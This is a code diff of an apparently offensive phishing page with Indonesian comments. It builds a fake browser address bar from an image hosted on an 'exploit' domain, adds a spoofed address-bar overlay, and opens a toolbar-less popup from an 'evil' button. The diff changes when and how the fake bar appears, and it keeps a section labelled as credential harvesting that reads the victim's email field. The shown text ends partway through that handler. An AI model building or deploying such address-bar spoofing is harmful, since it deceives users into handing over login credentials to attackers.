@@ -22,7 +22,7 @@
       position: relative;
     }
 
-    /* --- Fake Address Bar (sticky di bawah) --- */
+    /* Fake Address Bar - awalnya disembunyikan */
     .fake-address-bar {
       position: fixed;
       bottom: 0;
@@ -36,7 +36,15 @@
       align-items: center;
       justify-content: center;
       cursor: pointer;
-      transition: transform 0.3s ease;
+      transition: opacity 0.6s ease, transform 0.4s ease;
+      opacity: 0;
+      pointer-events: none; /* awalnya tidak bisa diklik */
+      transform: translateY(20px);
+    }
+    .fake-address-bar.visible {
+      opacity: 1;
+      pointer-events: auto;
+      transform: translateY(0);
     }
     .fake-address-bar img {
       max-height: 100%;
@@ -44,13 +52,13 @@
       display: block;
     }
 
-    /* --- Spoofed Address Bar Animation (arc2) --- */
+    /* Spoofed Address Bar Animation (arc2) */
     .spoofed-bar-overlay {
       position: fixed;
       bottom: 0;
       left: 0;
       right: 0;
-      height: 50vh;               /* setengah layar */
+      height: 80vh;
       background: rgba(0, 0, 0, 0.4);
       z-index: 9998;
       display: none;
@@ -74,7 +82,7 @@
       opacity: 1;
     }
 
-    /* --- Konten utama --- */
+    /* Konten utama tetap seperti sebelumnya */
     .top-bar {
       position: fixed;
       top: 0;
@@ -194,7 +202,8 @@
   </style>
 </head>
 <body>
-  <!-- Fake address bar yang sticky di bawah -->
+
+  <!-- Fake address bar - awalnya tidak terlihat -->
   <div class="fake-address-bar" id="fakeAddressBar">
     <img src="https://0x1337-exploit.github.io/hosting/staging/arc1.jpeg" alt="Fake address bar" />
   </div>
@@ -204,7 +213,7 @@
     <div class="spoofed-bar-content"></div>
   </div>
 
-  <!-- Konten utama -->
+  <!-- Top bar dengan tombol trigger -->
   <div class="top-bar" id="topBar">
     <button class="evil-btn" id="evilTrigger">Open New Page</button>
   </div>
@@ -231,13 +240,19 @@
   </div>
 
   <script>
-    // 1. Tombol "Open New Page" menghilang setelah diklik
+    // --- 1. Trigger utama: Open New Page ---
     const evilButton = document.getElementById("evilTrigger");
     const topBar = document.getElementById("topBar");
+    const fakeAddressBar = document.getElementById("fakeAddressBar");
 
     evilButton.addEventListener("click", () => {
+      // Hilangkan top bar
       topBar.classList.add("hidden");
 
+      // Tampilkan fake address bar dengan animasi halus
+      fakeAddressBar.classList.add("visible");
+
+      // Buka tab panah jebakan
       const newWin = window.open("", "_blank", "width=900,height=700,menubar=no,toolbar=no,scrollbars=yes");
       if (newWin) {
         newWin.document.write(`
@@ -285,20 +300,19 @@
       }, 600);
     });
 
-    // 2. Klik fake address bar → muncul animasi arc2
-    const fakeAddressBar = document.getElementById("fakeAddressBar");
+    // --- 2. Klik fake address bar (yang baru muncul) → animasi arc2 ---
     const spoofedOverlay = document.getElementById("spoofedOverlay");
 
     fakeAddressBar.addEventListener("click", () => {
       spoofedOverlay.classList.add("active");
 
-      // Optional: tutup overlay setelah beberapa detik (misal 4 detik)
+      // Auto tutup setelah 4 detik (bisa diubah/dihapus)
       setTimeout(() => {
         spoofedOverlay.classList.remove("active");
       }, 4000);
     });
 
-    // 3. Harvest credential (tetap seperti sebelumnya)
+    // --- 3. Harvest credential (tetap) ---
     document.getElementById("submitBtn").addEventListener("click", (e) => {
       e.preventDefault();
       const email = document.getElementById("emailField").value.trim();
